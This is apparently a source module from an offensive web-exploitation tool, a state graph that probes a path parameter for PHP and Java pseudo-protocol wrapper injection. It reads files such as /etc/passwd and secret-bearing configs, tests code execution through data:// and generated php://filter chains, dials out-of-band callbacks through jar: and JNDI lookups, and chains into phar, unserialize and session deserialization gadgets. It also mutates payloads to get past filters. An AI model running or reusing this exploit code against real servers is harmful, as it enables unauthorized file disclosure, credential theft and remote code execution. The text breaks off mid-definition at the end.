"""The pseudo-protocol state graph.

    probe.read ---> probe.code ---> probe.archive ---> probe.remote
         |                                                   |
         +-----------------------> report <------------------+

A parameter that holds a path is a dispatch point: whichever runtime sits behind
it decides what `php://filter` or `jar:http://...!/` means. So the graph asks in
the order that costs least and settles most - a local read first, because one
request tells you whether anything is passed through at all; code execution next,
because it is the outcome that matters; archives after that, because they need
something already uploaded; and reaching out last, because it needs a listener
and only makes sense once the parameter is known to carry something.

Each action stops at the first wrapper that answers. The evidence is a string
only the target's own behaviour produces: file contents, an expanded filter, a
marker this run invented, or a connection back to the listener.
"""

from __future__ import annotations

import base64
import binascii
import re
import secrets

from ...core.filters import php_runner
from ...core.mutate import Kind, Variant, mutator
from ...engine.blackboard import READ_FACT_PREFIX, Confidence
from ...engine.evidence import Judge, Verdict
from ...engine.filterprobe import probe_filter, probe_without_agent
from ...engine.inject import (
    candidates as _candidates,
    inject as _inject,
    inject_escalating as _inject_escalating,
    note_finding as _emit_finding,
    record as _record,
)
from ...engine.statemachine import Action, RunContext, State, StateGraph, Transition
from ...engine.webroot import note_read
from .seeds import (
    FILE_TARGETS,
    GENERIC_REMOTE,
    JAVA_URL,
    PHP_ARCHIVE,
    PHP_CODE,
    PHP_FILTER_READ,
    PHP_PLAIN_READ,
    ROOT_DISCLOSURE_TARGETS,
    Wrapper,
    php_code,
)

FINDINGS = "proto.findings"
WRAPPERS = "proto.wrappers"
RUNTIME = "proto.runtime"
PROVEN = "proto.proven"
UNSERIALIZE_SINK = "proto.unserialize.sink"

# Families whose payloads read a file the host keeps, not one the application
# owns. Asking a Java file reader for `index.php` proves nothing.
_SYSTEM_FAMILIES = frozenset({"java-read"})


# --------------------------------------------------------------------- helpers


def _note_finding(ctx: RunContext, entry: dict) -> None:
    _emit_finding(ctx, FINDINGS, entry)


def _read_wrappers() -> list[Wrapper]:
    """Local reads, most conclusive first."""
    return [w for w in PHP_FILTER_READ + PHP_PLAIN_READ + JAVA_URL if not w.remote]


def _remote_wrappers() -> list[Wrapper]:
    return [w for w in PHP_ARCHIVE + JAVA_URL if w.remote] + list(GENERIC_REMOTE)


def _file_targets(ctx: RunContext) -> list[str]:
    """Files to ask for: the ones the operator named, then the usual ones.

    Naming a file is not a reason to stop asking whether the parameter is
    injectable at all. A file the application cannot read is a common answer -
    apache writes its own logs `640 root:adm` - and a run that only ever asked
    for that one file ends by reporting no wrapper produced evidence, which reads
    as "not vulnerable" for a parameter that is.
    """
    named = list(ctx.config.get("read") or [])
    return named + [target for target in FILE_TARGETS if target not in named]


def _targets_for(wrapper: Wrapper, targets: list[str], named=()) -> list[str]:
    """Which paths to ask this wrapper for.

    A file the operator named is asked for, all of them and first: the flag says
    repeatable and each one was named for a reason, so a list of two absolute
    paths is two questions rather than one.

    The rest is the probe's own choice of files, and there one of each kind is
    enough. A wrapper that reads through a scheme can be asked for a file the
    application serves and for one the system owns, and the two answer different
    questions: reading the application's own page proves the wrapper resolves,
    reading the password file proves it reaches outside. Asking only one of them
    leaves half the wrapper's own signature list unable to fire, and a signature
    that can never match is a probe that can never succeed however well the
    target behaves.

    Measured on a live target: `php://filter/convert.base64-encode` was asked for
    `index.php` and nothing else. That answered with the base64 of an HTML page,
    which matches none of the wrapper's signatures, while `cm9vdDp4` - the base64
    of `root:x`, in that same list - describes a file that was never requested.
    The read worked and the run reported no evidence.

    Which kind comes first is the wrapper's own signature list's business: a
    wrapper that names a system file is asked for one first.
    """
    if not targets:
        return []
    asked = [target for target in targets if target in named]
    rest = [target for target in targets if target not in named]

    absolute = [t for t in rest if t.startswith("/")]
    relative = [t for t in rest if not t.startswith("/")]

    if wrapper.family in _SYSTEM_FAMILIES:
        return asked + (absolute or rest)[:1]
    if "://" not in wrapper.payload:
        return asked + ((absolute or rest)[:1] if absolute else rest[:1])

    order = (absolute, relative) if _names_a_system_file(wrapper) else (relative, absolute)
    picked: list[str] = []
    for group in order:
        if group and group[0] not in picked:
            picked.append(group[0])
    return asked + (picked or rest[:1])


# Markers that describe a file the system owns rather than one the application
# serves. They are how a wrapper says which of the two questions it expects its
# answer from.
_SYSTEM_MARKERS = ("root:x:0:0", "root:.*:0:0", "passwd", "win.ini", "boot.ini")


def _names_a_system_file(wrapper: Wrapper) -> bool:
    return any(marker in signature for signature in wrapper.signatures for marker in _SYSTEM_MARKERS)


def _runtime_of(wrapper: Wrapper) -> str:
    if wrapper.family.startswith("php"):
        return "php"
    if wrapper.family.startswith("java"):
        return "java"
    return "unknown"


# What a file that was actually read tends to leave behind. A wrapper's own
# signatures describe the files it is usually aimed at, which is fine while the
# tool is picking the files. The moment an operator names one - a flag, a config,
# a key - nobody knows what is in it, and judging a successful read by whether it
# contains `root:x:0:0` reports the one file someone actually wanted as nothing
# at all. The baseline is what keeps this honest: a signature the page already
# prints is refused before it is ever matched.
NAMED_FILE_SIGNATURES = (
    "flag{",
    "FLAG{",
    "ctf{",
    "CTF{",
    "root:x:0:0",
    "<?php",
    "for 16-bit app support",
    "[fonts]",
    "-----BEGIN",
    "DB_PASSWORD",
    "SECRET_KEY",
    "private_key",
)


def _signatures_for(wrapper: Wrapper, named: bool) -> tuple[str, ...]:
    """What counts as proof, which depends on whether the file was named."""
    if not named:
        return tuple(wrapper.signatures)
    return tuple(wrapper.signatures) + NAMED_FILE_SIGNATURES


# A path no application has. Asking the same wrapper for it is what turns "the
# response changed" into evidence: if reading the named file and reading a file
# that does not exist produce the same bytes, nothing was read - whatever the
# signatures say - and if they differ, the difference came from the file.
MISSING_PATH = "/nonexistent-ik-probe/does-not-exist"


def _differs_from_missing(
    ctx: RunContext, param, wrapper: Wrapper, target: str, seen: str, variant
) -> bool:
    """Whether asking for a file that is not there produces something else.

    The signature lists can only recognise files somebody already knew about. An
    operator naming a flag, a key or a config is asking about a file whose
    contents nobody can predict, and a wrapper that reads it perfectly well comes
    back with bytes no table matches. One extra request answers what a table
    cannot: the same wrapper, the same parameter, a path that cannot exist.

    The control is built from the variant that was actually sent, not from the
    seed. When a filter refused the plain spelling, the response being judged came
    from a rewritten one, and comparing it against an unrewritten control is
    comparing a refusal page against the application's own error page - they
    differ, and the difference has nothing to do with whether the file is there.
    Whatever got through is what the control has to be made of.

    The comparison is made after each payload is removed from its own response.
    A page that reflects the parameter back is the normal case, and there the two
    responses differ by construction - they carry different payloads. Comparing
    them raw would call every named file a success on exactly the pages where the
    reflection warning fires, which is the opposite of useful.
    """
    if target == MISSING_PATH:
        return False
    control = _same_spelling(wrapper, variant)
    outcome = _inject(ctx, param, control, "probe.read.control")
    if outcome is None:
        return False
    _, exchange = outcome
    if exchange.response.error:
        return False
    return Judge.strip_echo(exchange.response.text, control) != Judge.strip_echo(
        seen, variant.value
    )


def _same_spelling(wrapper: Wrapper, variant) -> str:
    """The payload this variant was, aimed at a path that is not there.

    The rewrites are replayed in the order they were applied, so the control asks
    the same question in the same spelling - which is the only way the two
    responses are comparable.
    """
    value = wrapper.payload.format(file=MISSING_PATH)
    for name in variant.mutators:
        item = mutator(name)
        if item is not None:
            value = item.apply(value)
    return value


def _path_of(payload: str) -> str:
    """The file path inside a payload, whatever wrapper was built around it.

    A read that worked says two things: the wrapper is accepted, and the path it
    named exists. The second is worth keeping whichever spelling produced it -
    `php://filter/convert.base64-encode/resource=/var/www/html/flag.php` is a
    statement about `/var/www/html/flag.php`, and so is `/etc/passwd` on its own.
    """
    for marker in ("resource=", "resource = "):
        index = payload.find(marker)
        if index != -1:
            candidate = payload[index + len(marker):]
            return candidate.split("|")[0].strip()
    if "://" not in payload:
        return payload.strip()
    return ""


# What an operator asked for by name, and the answer that came back.
#
# The session remembers that the read action ran on this page, and that is the
# right thing to skip - but "a file was read here once" is not the file, and a
# second run that skips the action has the payload to show and nothing else.
# What is kept instead is the answer to the question, so a later run re-asks it
# and gets the same file back without spending a request. That is the shape the
# session already uses for everything else it learned: what was found, keyed by
# what it was found by.
#
# The prefix is the board's, because the board is what renders a result: this
# module decides which files are worth reading, and the summary decides how a
# file that was read is shown.
REMEMBERED_READ = READ_FACT_PREFIX


def _remembered_read(ctx: RunContext, path: str) -> str:
    if not path:
        return ""
    value = ctx.blackboard.get(REMEMBERED_READ + path)
    return value if isinstance(value, str) else ""


def _has_read(ctx: RunContext, path: str) -> bool:
    """Whether the file is known, which an empty file still is.

    The value of a file that was read can be an empty string, and asking for the
    value cannot tell that apart from never having asked. The fact's presence
    can.
    """
    return bool(path) and ctx.blackboard.has(REMEMBERED_READ + path)


def _remember_read(ctx: RunContext, path: str, content: str) -> None:
    """Keep the file, including when it turned out to be empty.

    An empty file is an answer - "there is nothing in it" - and skipping the
    record for it left the operator with a run that reported the file as not read
    when the read had worked perfectly.
    """
    if path:
        ctx.blackboard.set(
            REMEMBERED_READ + path,
            content,
            evidence="the file an earlier run read, kept so a later one need not ask again",
            confidence=Confidence.CONFIRMED,
        )


# A base64 run, four characters at least, so that padding and short files are
# included. Only used where the wrapper has already said the answer is encoded.
_BASE64_RUN = re.compile(rb"[A-Za-z0-9+/]{4,}={0,2}")


def _decoded_file(body: str) -> str | None:
    """The file, decoded the way the payload asked for it.

    A wrapper whose payload is `php://filter/convert.base64-encode` answers with
    the file in base64 - that is what it does, and the tool built the payload, so
    it does not have to infer the encoding from the shape of the response.

    That is why there is no minimum length here. The judge's decoder looks for
    blobs long enough to be worth decoding in an ordinary page, and a threshold
    chosen for that is far too high for a file: measured, `/etc/hostname` came
    back as `NDg4YTA1NWI0ZTZjCg==`, twenty characters, and `--read` reported the
    file as not read while the response was carrying it.

    Nor is there a printability test any more, for the same reason one step on: a
    file can hold bytes that are not text, and a control character in it made the
    whole read disappear. The wrapper said the answer is encoded, so a blob that
    decoded is the file.

    None means no blob decoded at all - nothing was read. An empty string means a
    blob decoded to nothing, which is a file with nothing in it, and that is an
    answer rather than a failure.
    """
    raw = body.encode("latin-1", "replace")
    decoded_blobs: list[bytes] = []
    for blob in _BASE64_RUN.findall(raw):
        try:
            decoded_blobs.append(base64.b64decode(blob + b"=" * (-len(blob) % 4), validate=True))
        except (binascii.Error, ValueError):
            continue
    if not decoded_blobs:
        return None
    texts = [item.decode("utf-8", "replace") for item in decoded_blobs]
    # A reading that is not in the response had to be decoded to exist, which is
    # the file rather than a word of the page that happens to be valid base64.
    fresh = [text for text in texts if text and text not in body]
    pool = fresh or [text for text in texts if text]
    if not pool:
        return ""
    return max(pool, key=len)


def _named_file_contents(wrapper: Wrapper, body: str, payload: str) -> str | None:
    """The file itself, out of the page that carried it.

    A read that is proved and not shown is half a result: the operator asked for
    a file and the tool answers that it could be read. And a read is a result, so
    the same work decides what the file is - which is why the wrapper's own
    encoding is used rather than a second, differently-guessed decoding of the
    response.

    None means nothing was decoded, and an empty string means a file with nothing
    in it. The caller has to tell those apart: one is a read that did not happen,
    the other is a read that answered.

    Only for a file the operator named. The probe's own reads are about whether a
    wrapper works, and printing the application's page at whoever ran it is noise.
    """
    cleaned = Judge.strip_payload(body.encode("latin-1", "replace"), payload)
    if wrapper.decoded:
        return _decoded_file(cleaned.decode("latin-1", "replace"))

    raw = cleaned.decode("latin-1", "replace")
    views = [v for v in Judge.decoded_views(cleaned) if len(v) > 8 and "<html" not in v.lower()]
    # A view that does not appear in the response is one that had to be decoded
    # to exist, which is the file rather than the page carrying it. The raw text
    # is a view too, and it is the one that holds the base64 - so preferring the
    # first view prints the encoding instead of what was encoded.
    decoded = [v for v in views if v not in raw]
    if decoded:
        return max(decoded, key=len)
    plain = [v for v in views if "<" not in v]
    return max(plain, key=len) if plain else None


def _proven(
    ctx: RunContext,
    wrapper: Wrapper,
    param,
    variant,
    request,
    verdict,
    note: str = "",
    body: str = "",
) -> None:
    """Record a wrapper that answered, as a finding and on the board."""
    entry = {
        "name": wrapper.name,
        "param": param.key(),
        "payload": variant.value,
        "generation": variant.generation,
        "request": request.to_bytes().decode("latin-1"),
        "evidence": note or verdict.reason,
        "detail": getattr(verdict, "detail", ""),
        "family": wrapper.family,
        "wrapper_note": wrapper.note,
    }
    _note_finding(ctx, entry)
    _record(ctx, WRAPPERS, wrapper.name, evidence=note or verdict.reason, confidence=Confidence.CONFIRMED)

    # A file the operator named is what they asked for, so they get to see it -
    # and it is kept, so the next run can show it again from what was learned
    # rather than from what it spent.
    if ctx.config.get("read") and body:
        shown = _named_file_contents(wrapper, body, variant.value)
        if shown is not None:
            path = _path_of(variant.value) or variant.value
            _remember_read(ctx, path, shown)
            # What was read, not what it said, and once. The file itself goes in
            # the result at the end, where the answer belongs - not once for
            # every wrapper that turned out to reach it. An empty file still
            # counts as read: it has an answer, and it is not an empty string in
            # the report.
            ctx.announce(f"read.{path}", f"  [+] read {path}")

    # A file that was read says where files live, and whoever writes one next
    # needs that. Only reads count: a `data://` payload has no path in it, and
    # the wrapper's own spelling is not a location on the target. The response is
    # scanned as well, because a server's configuration names the directory it
    # serves and that settles the question rather than narrowing it.
    if wrapper.family.endswith("read") or wrapper.family == "read":
        note_read(ctx.blackboard, _path_of(variant.value), body)

    ctx.blackboard.set(
        PROVEN,
        True,
        evidence=f"{wrapper.name} answered through {param.key()}",
        confidence=Confidence.CONFIRMED,
    )
    runtime = _runtime_of(wrapper)
    if runtime != "unknown":
        ctx.blackboard.set(
            RUNTIME,
            runtime,
            evidence=f"{wrapper.name} is a {runtime} wrapper and it worked",
            confidence=Confidence.LIKELY,
        )


def _try_wrapper(ctx: RunContext, param, wrapper: Wrapper, action: str, targets: list[str], escalate: bool = True) -> bool:
    """Send one wrapper and judge what came back. True if it answered.

    `escalate=False` sends the wrapper exactly as written and moves on. That is
    how the first pass reaches every family cheaply: a payload a filter refuses
    costs one request instead of a dozen rewrites, and the families further down
    the list get their turn before the budget is spent on the first one.
    """
    # The files the operator named, if any. Every one of them is a question, so
    # reaching one is not an answer to the others: a run that stopped at the
    # first success and then reported the rest as "not read" is wrong about why.
    asked = tuple(ctx.config.get("read") or ())
    answered = False

    # A question that was already answered is not asked again, and that applies
    # to the whole wrapper rather than to one of the paths it would have tried.
    # The session remembers that this page was probed; what it did not remember
    # was the file, so a run that re-entered the action to show it went and
    # re-probed everything else on the way. Measured: twenty-eight requests for
    # an answer the session already held.
    for target in targets:
        if _has_read(ctx, target):
            ctx.announce(
                f"read.{target}", f"  [+] read {target} (resumed from an earlier run)"
            )
            answered = True
    if answered:
        return True

    for target in _targets_for(wrapper, targets, asked):
        payload = wrapper.payload.format(file=target)
        if escalate:
            outcome = _inject_escalating(ctx, param, payload, action, kind=Kind.PROTOCOL)
        else:
            request, exchange = _inject(ctx, param, payload, action)
            outcome = (request, exchange, Variant(value=payload, generation=0))
        if outcome is None:
            continue
        request, exchange, variant = outcome
        if exchange.response.error:
            continue
        named = bool(ctx.config.get("read"))
        verdict = ctx.judge.signature(
            exchange.response,
            _signatures_for(wrapper, named),
            variant.value,
            param.value,
        )
        if not verdict.confirmed and named:
            # No signature matched, but a file the operator named may simply have
            # contents no table could list. One control request separates "the
            # wrapper read it" from "the wrapper answered with the page".
            if _differs_from_missing(ctx, param, wrapper, target, exchange.response.text, variant):
                verdict = Verdict(
                    confirmed=True,
                    confidence=Confidence.LIKELY,
                    reason="the response differs from the same wrapper asking for a path that does not exist",
                    matched=target,
                )
        if not verdict.confirmed:
            continue
        _proven(ctx, wrapper, param, variant, request, verdict, body=exchange.response.text)
        answered = True
        if target in asked and not all(_has_read(ctx, one) for one in asked):
            # More named files to get. The wording of a "not read" line has to be
            # true, and stopping here would make it say a file was unreadable
            # when nobody asked for it yet.
            continue
        return True
    return answered


# --------------------------------------------------------------------- actions


def probe_read(ctx: RunContext) -> None:
    """Ask for a file through every wrapper that reads one.

    Two passes. The first sends every wrapper as written, so every family gets a
    turn before any request is spent on rewrites - a rule set that refuses one
    form of one wrapper would otherwise eat the whole budget before the next
    family is even tried. The second pass goes back over what did not answer and
    climbs the mutation generations, which is where a filter that only knows the
    usual spelling is defeated.
    """
    wrappers = _read_wrappers()
    targets = _file_targets(ctx)
    for param in _candidates(ctx):
        if ctx.stopped:
            return
        answered: set[str] = set()
        for wrapper in wrappers:
            if ctx.stopped:
                return
            if _try_wrapper(ctx, param, wrapper, "probe.read", targets, escalate=False):
                answered.add(wrapper.name)
        for wrapper in wrappers:
            if ctx.stopped:
                return
            if wrapper.name in answered:
                # It already answered as written; there is nothing left to climb.
                continue
            _try_wrapper(ctx, param, wrapper, "probe.read", targets, escalate=True)


def probe_code(ctx: RunContext) -> None:
    """Ask the target to run something, through the wrappers that do that.

    The marker is invented per run, so a page that echoes our input cannot be
    mistaken for a page that executed it. That distinction is the whole reason
    this action exists separately from the read probes: `data://` reaching a
    parser and `data://` being executed look identical until something only the
    target could produce comes back.
    """
    marker = f"ik{secrets.token_hex(4)}"
    encoded = base64.b64encode(php_code(marker).encode()).decode()
    for param in _candidates(ctx):
        if ctx.stopped:
            return
        for wrapper in PHP_CODE:
            if ctx.stopped:
                return
            payload = wrapper.payload.format(code=encoded, callback="", file="", upload="")
            outcome = _inject_escalating(ctx, param, payload, "probe.code", kind=Kind.PROTOCOL)
            if outcome is None:
                continue
            request, exchange, variant = outcome
            if exchange.response.error:
                continue
            if marker not in exchange.response.text:
                continue
            reason = f"the marker {marker} came back"
            _proven(ctx, wrapper, param, variant, request, _Evidence(reason), note=reason)
            return


def find_archive_sink(ctx: RunContext) -> None:
    """Find the parameter the target hands to something that opens archives.

    This is what an uploaded phar needs in order to matter. On PHP 8 a metadata
    blob is deserialized only when the application asks for it, so the chain
    needs a call site that opens an archive it was pointed at - and applications
    do have those, for configuration, caches and bundles.

    The call site announces itself. Point a parameter at a file that is not an
    archive and PHP answers `Cannot create phar ... file extension not
    recognised`, which can only come from a value reaching `new Phar(...)`. A
    parameter that merely gets read answers with a not-found instead, and the two
    are not the same finding.
    """
    from ...engine.archivesink import probe_archive_sink

    for param in _candidates(ctx):
        if ctx.stopped:
            return
        found = probe_archive_sink(ctx, param)
        if not found.confirmed:
            continue
        ctx.emit(f"  [+] {found.describe()}")
        ctx.blackboard.set(
            "proto.archive.sink",
            found.param,
            evidence=found.describe(),
            confidence=Confidence.CONFIRMED,
        )
        _record(
            ctx,
            "archive-sink",
            found.param,
            evidence=found.evidence,
            confidence=Confidence.CONFIRMED,
        )
        return


def probe_archive(ctx: RunContext) -> None:
    """Reach a file through a container, when one is known to be there."""
    find_archive_sink(ctx)

    upload = ctx.config.get("upload") or ""
    targets = _file_targets(ctx)
    for param in _candidates(ctx):
        if ctx.stopped:
            return
        for wrapper in PHP_ARCHIVE:
            if ctx.stopped:
                return
            if wrapper.remote:
                # Reaching out belongs to probe.remote, where the proof is the
                # connection rather than the body.
                continue
            if wrapper.needs == "upload" and not upload:
                continue
            payload = wrapper.payload.format(file=targets[0] if targets else "", upload=upload)
            outcome = _inject_escalating(ctx, param, payload, "probe.archive", kind=Kind.PROTOCOL)
            if outcome is None:
                continue
            request, exchange, variant = outcome
            if exchange.response.error:
                continue
            verdict = ctx.judge.signature(
                exchange.response, wrapper.signatures, variant.value, param.value
            )
            if not verdict.confirmed:
                continue
            _proven(ctx, wrapper, param, variant, request, verdict, body=exchange.response.text)


def probe_remote(ctx: RunContext) -> None:
    """Payloads whose proof is a connection back, not a body.

    `jar:` downloads an archive before it does anything else, and a JNDI lookup
    dials the address it is given. Neither answers in the response - the target's
    own network makes the request, which is also why this is the payload family
    that reaches past a filter judging the string.
    """
    oob = ctx.oob
    if oob is None or not getattr(oob, "running", False):
        ctx.blackboard.mark_not_covered(
            "probe.remote", "no listener was given, so the remote wrappers were skipped"
        )
        return

    wait = float(ctx.config.get("oob_wait", 5.0))
    for param in _candidates(ctx):
        if ctx.stopped:
            return
        for wrapper in _remote_wrappers():
            if ctx.stopped:
                return
            url, token = oob.new_url(f"{wrapper.name}:{param.key()}")
            authority = url.split("://", 1)[-1]
            payload = wrapper.payload.format(callback=authority, file="", upload="", code="")
            outcome = _inject_escalating(ctx, param, payload, "probe.remote", kind=Kind.PROTOCOL)
            if outcome is None:
                continue
            request, exchange, variant = outcome
            hits = oob.wait(token, timeout=wait)
            if not hits:
                continue
            _proven(
                ctx,
                wrapper,
                param,
                variant,
                request,
                _Evidence("the target called back"),
                note=f"the target connected back: {hits[0].detail}",
            )


class _Evidence:
    """A verdict stand-in for evidence that is not a body.

    A callback, or a marker this run invented, is conclusive in a way a
    signature match is not - so it does not need the judge to weigh it.
    """

    def __init__(self, reason: str, detail: str = "") -> None:
        self.reason = reason
        self.detail = detail


def probe_filter_action(ctx: RunContext) -> None:
    """Ask once whether anything is filtering, before payloads are spent.

    Two questions, and they catch different things. A probe carrying SQL, a
    script tag, a traversal and a shell metacharacter is what a rule set is
    written to catch, and the answer to it names the product when the product
    names itself. A request with no User-Agent at all is what almost every filter
    treats as a scanner, so it finds the ones that do not advertise.

    Doing this first means the escalation ladder starts where it should rather
    than discovering it one refusal at a time.
    """
    candidates = _candidates(ctx)
    if not candidates:
        return

    outcome = probe_filter(ctx, candidates[0])
    if outcome.refused:
        ctx.info(f"   {outcome.describe()}")
        ctx.blackboard.set(
            "filter.detected",
            True,
            evidence=outcome.describe(),
            confidence=Confidence.LIKELY,
        )
    elif outcome.note:
        ctx.info(f"   {outcome.note}")

    bare = probe_without_agent(ctx, candidates[0])
    if bare.refused and bare.note:
        ctx.info(f"   {bare.note}")
        ctx.blackboard.set(
            "filter.watches-for-scanners",
            True,
            evidence=bare.note,
            confidence=Confidence.LIKELY,
        )
    elif bare.note:
        ctx.log(f"   {bare.note}")


def classify(ctx: RunContext) -> None:
    """Say what the parameter turned out to be, or that nothing came through."""
    if not ctx.blackboard.get(PROVEN):
        ctx.blackboard.set(
            RUNTIME,
            "unknown",
            evidence="no wrapper produced evidence this run",
            confidence=Confidence.INCONCLUSIVE,
        )
        return
    runtime = ctx.blackboard.get(RUNTIME) or "unknown"
    ctx.log(f"   the parameter accepts {runtime} wrappers")


def exploit_filter_chain(ctx: RunContext) -> None:
    """Turn a read into execution, with nothing written to disk.

    A parameter that reaches `include()` and accepts `php://filter` is not a file
    reader, it is a code runner waiting for the right stream. The chain built
    here manufactures its payload byte by byte - iconv conversions insert one
    base64 character at a time and each decode keeps only what it recognises - so
    what the application includes is content that exists nowhere on the target.

    Off unless `--exploit` is given, for the same reason the other chains are:
    running code on someone's server is the operator's decision.
    """
    if not ctx.config.get("exploit"):
        ctx.blackboard.mark_not_covered(
            "exploit.filter_chain", "not requested; pass --exploit to run code on the target"
        )
        return

    marker = f"ik{secrets.token_hex(4)}"
    chain = php_runner(f"echo '{marker}';")
    for param in _candidates(ctx):
        if ctx.stopped:
            return
        outcome = _inject_escalating(ctx, param, chain, "exploit.filter_chain", kind=Kind.PROTOCOL)
        if outcome is None:
            continue
        request, exchange, variant = outcome
        if exchange.response.error:
            continue
        if marker not in exchange.response.text:
            continue
        reason = f"the marker {marker} came back from a payload built inside the stream"
        _proven(ctx, _CHAIN, param, variant, request, _Evidence(reason), note=reason)
        ctx.blackboard.set(
            "proto.rce",
            True,
            evidence=(
                f"a generated chain ran: {reason}. This proves the target executes what the "
                "chain builds. No command was sent - add --os-cmd or --os-shell to run one"
            ),
            confidence=Confidence.CONFIRMED,
        )
        ctx.info(
            "   the chain runs here. Nothing was executed: this only sent an echo. "
            "Use --os-cmd or --os-shell to send a command"
        )
        return


# The chain is not in the seed tables - it is built at run time - so it needs a
# name of its own to be reported under.
_CHAIN = Wrapper(
    "php-filter-chain",
    "php://filter/<generated>",
    family="php-exec",
    signatures=(),
    note="a filter chain that builds its payload in the stream; no file, no upload",
)


def probe_webroot(ctx: RunContext) -> None:
    """Read the server's own configuration to learn which directory it serves.

    Everything else about the web root is inference: a path read somewhere is a
    good clue, a stock location is a guess. A server's configuration is not -
    `DocumentRoot /var/www/html` is the server stating which directory it answers
    from, and it is usually readable, because the server writes its own logs as
    the same user the application runs as.

    Worth the requests because a chain that writes a file needs an absolute path
    and there is no getting one from a relative path: PHP resolves those against
    the process's working directory, which for a web request is not reliably the
    directory it serves. Measured, not assumed - a gadget given a relative path
    wrote into the filesystem root, where nothing is served.
    """
    if ctx.config.get("webroot"):
        return
    if ctx.blackboard.get("target.paths.webroot"):
        return

    from ...engine.webroot import webroot_from_config

    for param in _candidates(ctx):
        if ctx.stopped:
            return
        for path in ROOT_DISCLOSURE_TARGETS:
            if ctx.stopped:
                return
            outcome = _inject(ctx, param, path, "probe.webroot")
            if outcome is None:
                continue
            _, exchange = outcome
            if exchange.response.error:
                continue
            for found in webroot_from_config(exchange.response.text):
                ctx.info(f"   the server's configuration says it serves {found}")
                ctx.blackboard.add(
                    "target.paths.webroot",
                    found,
                    evidence=f"{path} names it",
                    confidence=Confidence.CONFIRMED,
                )
                return


def run_phar_chain(ctx: RunContext) -> None:
    """The archive chain, reached only when a gadget was named.

    Imported here rather than at module scope: `deserialize` asks this module for
    the run's parameters, and a top-level import in both directions is a cycle.
    """
    from .deserialize import exploit_phar

    exploit_phar(ctx)


def run_unserialize_chain(ctx: RunContext) -> None:
    """The same gadget, handed straight to a parameter instead of inside an archive."""
    from .deserialize import exploit_unserialize

    exploit_unserialize(ctx)


def find_unserialize_sink(ctx: RunContext) -> None:
    """Look for the parameter whose value is handed to `unserialize()`.

    Worth doing before the chain is aimed: it narrows which parameter the gadget
    is worth sending to, and when it hits it says why that one rather than the
    others. The chain does not depend on it - a production deployment sets
    `display_errors` off, and then the function's own error is thrown away - so a
    miss here is not a reason to skip the attempt.
    """
    if ctx.blackboard.get(UNSERIALIZE_SINK):
        return

    from ...engine.unserializesink import probe_unserialize_sink

    for param in _candidates(ctx):
        if ctx.stopped:
            return
        found = probe_unserialize_sink(ctx, param)
        if not found.confirmed:
            continue
        ctx.emit(f"  [+] {found.describe()}")
        ctx.blackboard.set(
            UNSERIALIZE_SINK,
            found.param,
            evidence=found.evidence,
            confidence=Confidence.CONFIRMED,
        )
        return


def run_session_chain(ctx: RunContext) -> None:
    """The session file, which is a call site rather than a parameter."""
    from .deserialize import exploit_session

    exploit_session(ctx)


def report_summary(ctx: RunContext) -> None:
    """Print what the run proved, and be explicit when it proved nothing."""
    # The chain state is not entered without --exploit, so an action that never
    # ran has to be recorded here: leaving it out would read as "tested and
    # clean" when it means "never tested".
    if not ctx.config.get("exploit"):
        ctx.blackboard.mark_not_covered(
            "exploit.filter_chain", "not requested; pass --exploit to run code on the target"
        )

    proven = bool(ctx.blackboard.get(PROVEN))
    refusals = ctx.bypass.refusals()

    if proven:
        runtime = ctx.blackboard.get(RUNTIME) or "unknown"
        ctx.emit(f"[+] result: the parameter accepts pseudo-protocol wrappers ({runtime})")
    else:
        ctx.emit("[-] result: no wrapper produced evidence on this target")

    # A file the operator named that did not come back is its own answer, and it
    # is not the same answer as "nothing here works" - so it is said either way.
    # Saying only the second is how a parameter that is injectable gets written
    # off because the one path asked for happened to be unreadable; saying only
    # the first is how the operator never learns the file they came for is not
    # there.
    missed = [path for path in (ctx.config.get("read") or []) if not _has_read(ctx, path)]
    if missed:
        note = f"    not read: {', '.join(missed)}"
        if not proven:
            note += (
                ". A file the application cannot read, or one that is not there, says "
                "nothing about whether the parameter is injectable - the usual files "
                "were asked as well, and none of them answered"
            )
        ctx.emit(note)

    if refusals:
        ctx.emit(f"  filter: {refusals} requests were refused")
        if not proven:
            ctx.emit("    the input surface is filtered; a wrapper may still work through a rewrite")


# ----------------------------------------------------------------- graph shape


def build_graph(name: str = "proto") -> StateGraph:
    """Assemble the pseudo-protocol graph. Names are stable; session files use them."""
    graph = StateGraph(name=name, start="probe")
    graph.add(
        State(
            name="probe",
            description="what this parameter will accept, and what it will give back",
            actions=[
                Action("filter.probe", "find out whether anything is filtering", probe_filter_action),
                Action(
                    "probe.read",
                    "read a file through every wrapper that can",
                    probe_read,
                    # A file the operator named is a request for its contents, and
                    # a cached "this page was read once" is not those contents.
                    # Skipping it is how `--read /etc/passwd` answers with the
                    # payload it would have used and nothing else.
                    wanted="read",
                ),
                Action("probe.webroot", "read the server's configuration for where it serves", probe_webroot),
                Action("probe.code", "ask the target to run something", probe_code),
                Action("probe.archive", "reach a file through a container", probe_archive),
                Action("probe.remote", "plant a callback and see if the target dials it", probe_remote),
                Action("classify", "say what the parameter turned out to be", classify),
            ],
            transitions=[
                Transition(
                    "chain",
                    # Not "a PHP wrapper answered": the chain does not need a
                    # successful read, it needs include() and a runtime that
                    # accepts php://filter. Gating it on the reads means a filter
                    # that blocks every read also blocks the execution attempt -
                    # the one action that might still get through - and the run
                    # reports nothing while the useful payload was never sent.
                    lambda ctx: bool(ctx.config.get("exploit"))
                    and ctx.blackboard.get(RUNTIME) != "java",
                    "code execution was asked for, and the runtime is not known to be Java",
                ),
                Transition("finish", lambda ctx: True, "nothing further to ask"),
            ],
        )
    )
    graph.add(
        State(
            name="chain",
            description="build the payload inside the stream instead of on disk",
            actions=[
                Action("exploit.filter_chain", "run code through a generated filter chain", exploit_filter_chain)
            ],
            transitions=[
                Transition(
                    "deserialize",
                    lambda ctx: bool(ctx.config.get("phar_class")),
                    "a gadget was named, so the archive chain is worth trying",
                ),
                Transition("finish", lambda ctx: True, "done"),
            ],
        )
    )
    graph.add(
        State(
            name="deserialize",
            description="get an archive's metadata deserialized on the target",
            actions=[
                Action(
                    "probe.unserialize-sink",
                    "look for the value that reaches unserialize()",
                    find_unserialize_sink,
                ),
                Action(
                    "exploit.phar",
                    "point the archive-opening parameter at a gadget and read the result",
                    run_phar_chain,
                ),
                Action(
                    "exploit.unserialize",
                    "hand the gadget to a parameter as a serialized value",
                    run_unserialize_chain,
                ),
                Action(
                    "exploit.session",
                    "find the session file and try to put a gadget in it",
                    run_session_chain,
                ),
            ],
            transitions=[Transition("finish", lambda ctx: True, "done")],
        )
    )
    graph.add(
        State(
